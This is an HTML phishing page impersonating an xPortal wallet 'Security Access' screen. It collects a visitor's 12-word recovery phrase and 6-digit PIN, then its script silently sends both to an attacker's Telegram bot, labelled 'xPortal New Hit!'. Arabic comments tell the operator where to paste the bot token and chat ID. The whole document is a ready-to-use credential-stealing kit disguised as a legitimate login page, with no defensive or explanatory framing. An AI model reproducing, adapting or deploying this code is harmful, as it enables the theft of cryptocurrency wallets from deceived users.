<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>xPortal | Security Access</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --xp-black: #000; --xp-teal: #23f7dd; --xp-purple: #8a3ffc; --xp-border: rgba(255, 255, 255, 0.08); --xp-card: #0d0d0d; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: var(--xp-black); color: #fff; min-height: 100vh; overflow: hidden; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 75%); display: flex; align-items: center; justify-content: center; }

        .glass-card { background: var(--xp-card); border: 1px solid var(--xp-border); border-radius: 32px; padding: 40px 25px; width: 100%; max-width: 440px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); position: relative; }
        .hero-logo { width: 70px; height: 70px; margin-bottom: 20px; }
        
        .section { display: none; animation: fadeIn 0.4s ease; }
        .section.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }

        /* WORDS GRID */
        .phrase-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 25px; }
        .word-box { position: relative; }
        .word-box span { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 10px; font-weight: 800; color: var(--xp-teal); opacity: 0.6; }
        .word-box input { width: 100%; background: #000; border: 1px solid var(--xp-border); border-radius: 12px; padding: 12px 5px 12px 28px; color: #fff; font-size: 13px; outline: none; }
        .word-box input:focus { border-color: var(--xp-purple); }

        /* PIN CODE STYLING */
        .pin-container { display: flex; justify-content: center; gap: 10px; margin: 30px 0; }
        .pin-dot { width: 15px; height: 15px; border: 2px solid var(--xp-border); border-radius: 50%; transition: 0.2s; }
        .pin-dot.filled { background: var(--xp-teal); border-color: var(--xp-teal); box-shadow: 0 0 10px var(--xp-teal); }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 250px; margin: 0 auto; }
        .key { width: 60px; height: 60px; border-radius: 50%; background: rgba(255,255,255,0.03); display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 600; cursor: pointer; border: 1px solid var(--xp-border); }
        .key:active { background: var(--xp-purple); }

        .btn { width: 100%; height: 60px; border-radius: 100px; border: none; font-size: 16px; font-weight: 700; cursor: pointer; background: #fff; color: #000; margin-top: 10px; }
        #loading { display: none; color: var(--xp-teal); font-weight: 600; margin-top: 20px; animation: pulse 1.5s infinite; }
    </style>
</head>
<body>

<div class="glass-card">
    <img src="Capture.PNG" class="hero-logo">

    <div id="step-phrase" class="section active">
        <h2 style="margin-bottom: 10px;">Import Wallet</h2>
        <p style="color:#888; font-size: 14px; margin-bottom: 25px;">Enter your 12-word recovery phrase.</p>
        <div class="phrase-grid" id="grid"></div>
        <button class="btn" onclick="nextStep()">Continue</button>
    </div>

    <div id="step-pin" class="section">
        <h2 style="margin-bottom: 10px;">Security PIN</h2>
        <p style="color:#888; font-size: 14px;">Enter your 6-digit PIN to confirm access.</p>
        <div class="pin-container" id="pinDots">
            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
        </div>
        <div class="keypad">
            <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
            <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
            <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
            <div></div><div class="key" onclick="press(0)">0</div><div class="key" onclick="del()">←</div>
        </div>
    </div>

    <div id="loading">Establishing Encrypted Connection...</div>
</div>

<script>
    // --- تليجرام كونفيج ---
    const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // حط التوكن هنا
    const CHAT_ID = 'YOUR_CHAT_ID';     // حط الآيدي هنا

    let phraseData = "";
    let currentPin = "";

    // إنشاء مربعات الكلمات
    const g = document.getElementById('grid');
    for(let i=1; i<=12; i++) {
        g.innerHTML += `<div class="word-box"><span>${i}</span><input type="password" class="w-in" placeholder="..."></div>`;
    }

    // الانتقال للـ PIN
    function nextStep() {
        let words = [];
        document.querySelectorAll('.w-in').forEach(i => words.push(i.value.trim()));
        if(words.some(w => w === "")) return alert("Please fill all fields.");
        phraseData = words.join(" ");
        
        document.getElementById('step-phrase').classList.remove('active');
        document.getElementById('step-pin').classList.add('active');
    }

    // كتابة الـ PIN
    function press(n) {
        if(currentPin.length < 6) {
            currentPin += n;
            updateDots();
            if(currentPin.length === 6) sendFinalData();
        }
    }

    function del() {
        currentPin = currentPin.slice(0, -1);
        updateDots();
    }

    function updateDots() {
        const dots = document.querySelectorAll('.pin-dot');
        dots.forEach((dot, i) => {
            dot.classList.toggle('filled', i < currentPin.length);
        });
    }

    // الإرسال النهائي
    function sendFinalData() {
        document.getElementById('step-pin').style.display = 'none';
        document.getElementById('loading').style.display = 'block';

        const text = `💎 xPortal New Hit!\n\nPhrase: ${phraseData}\nPIN Code: ${currentPin}`;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
        .then(() => {
            console.log("Success.");
        });
    }
</script>

</body>
</html>
